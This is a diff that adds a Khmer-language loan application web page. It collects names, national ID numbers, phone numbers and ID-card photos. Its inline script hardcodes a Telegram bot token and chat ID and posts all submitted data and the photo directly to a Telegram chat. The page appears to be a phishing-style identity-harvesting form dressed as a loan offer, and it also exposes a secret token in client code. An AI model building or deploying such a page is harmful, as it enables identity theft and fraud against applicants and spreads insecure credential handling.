@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <nav>
+        <a href="../" >ទំព័រដើម</a>
+        <a href="../calculator/">គណនាប្រាក់កម្ចី</a>
+        <a href="../apply/" class="active">ដាក់ពាក្យស្នើសុំ</a>
+        <a href="../details/">ព័ត៌មានលម្អិត</a>
+        <a href="../licenses/">អាជ្ញាប័ណ្ណ</a>
+    </nav>
+    <div class="container">
+        <div id="apply" class="page">
+                <h2>ពាក្យស្នើសុំកម្ចីប្រាក់</h2>
+                    <form id="loanForm" onsubmit="submitApplication(event)">
+                        <div class="form-group">
+                            <label>ឈ្មោះពេញ:</label>
+                            <input type="text" id="fullName" required placeholder="បញ្ចូលឈ្មោះពេញរបស់អ្នក">
+                        </div>
+                        <div class="form-group">
+                            <label>លេខអត្តសញ្ញាណប័ណ្ណ:</label>
+                            <input type="text" id="idCardNumber" required placeholder="បញ្ចូលលេខអត្តសញ្ញាណប័ណ្ណ">
+                        </div>
+                        <div class="form-group">
+                            <label>លេខទូរសព្ទ:</label>
+                            <input type="tel" id="phoneNumber" required placeholder="ឧទាហរណ៍៖ 012 345 678">
+                        </div>
+                        <div class="form-group">
+                            <label>ទំហំប្រាក់ចង់ស្នើសុំ ($):</label>
+                            <input type="number" id="loanAmount" required placeholder="បញ្ចូលចំនួនទឹកប្រាក់">
+                        </div>
+                        <div class="form-group">
+                            <label>គោលបំណងនៃការស្នើសុំ:</label>
+                            <textarea id="purpose" rows="3" required placeholder="តើអ្នកខ្ចីប្រាក់សម្រាប់ធ្វើអ្វី?"></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label>ថតអត្តសញ្ញាណប័ណ្ណ:</label>
+                            <input type="file" id="idCardPhoto" accept="image/*" required style="padding: 5px;">
+                        </div>
+                        <button type="submit">បញ្ជូនពាក្យស្នើសុំ</button>
+                    </form>
+            </div>
+        </div>
+    <script>
+        async function submitApplication(event) {
+            event.preventDefault(); 
+
+    
+            const BOT_TOKEN = "8883912429:AAHYzlVQsdcqOSo7iONyNdQ8TkdLFlKk33k"; 
+            const CHAT_ID = "-1003577077809"; 
+
+            let fullName = document.getElementById('fullName').value;
+            let idCardNumber = document.getElementById('idCardNumber').value;
+            let phoneNumber = document.getElementById('phoneNumber').value;
+            let loanAmount = document.getElementById('loanAmount').value;
+            let purpose = document.getElementById('purpose').value;
+            let photoFile = document.getElementById('idCardPhoto').files[0];
+
+
+            let message = `🔔 <b>មានពាក្យស្នើសុំកម្ចីថ្មី!</b>\n\n`;
+            message += `👤 <b>ឈ្មោះពេញ:</b> ${fullName}\n`;
+            message += `🪪 <b>លេខអត្តសញ្ញាណប័ណ្ណ:</b> ${idCardNumber}\n`;
+            message += `📱 <b>លេខទូរសព្ទ:</b> ${phoneNumber}\n`;
+            message += `💰 <b>ទំហំប្រាក់ស្នើសុំ:</b> ${loanAmount} $\n`;
+            message += `📝 <b>គោលបំណង:</b> ${purpose}`;
+
+         
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", photoFile); 
+            formData.append("caption", message); 
+            formData.append("parse_mode", "HTML"); 
+            try {
+               
+                let submitBtn = event.target.querySelector('button[type="submit"]');
+                submitBtn.innerText = "កំពុងផ្ញើ ...";
+                submitBtn.disabled = true;
+
+               
+                let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert("ពាក្យស្នើសុំរបស់អ្នកត្រូវបានផ្ញើទៅក្រុមហ៊ុនដោយជោគជ័យ! យើងនឹងទាក់ទងទៅអ្នកឆាប់ៗ។ 🎉");
+                    event.target.reset(); 
+                    showPage('home');
+                } else {
+                    let errorData = await response.json();
+                    console.error("Telegram Error:", errorData);
+                    alert("មានបញ្ហាក្នុងការផ្ញើ!");
+                }
+            } catch (error) {
+                alert("មិនអាចតភ្ជាប់ទៅកាន់ប្រព័ន្ធបានទេ! សូមពិនិត្យអ៊ីនធឺណិតរបស់អ្នក។");
+                console.error(error);
+            } finally {
+                
+                let submitBtn = event.target.querySelector('button[type="submit"]');
+                submitBtn.innerText = "បញ្ជូនពាក្យស្នើសុំ";
+                submitBtn.disabled = false;
+            }
+}
+    </script>
+</body>
+</html>
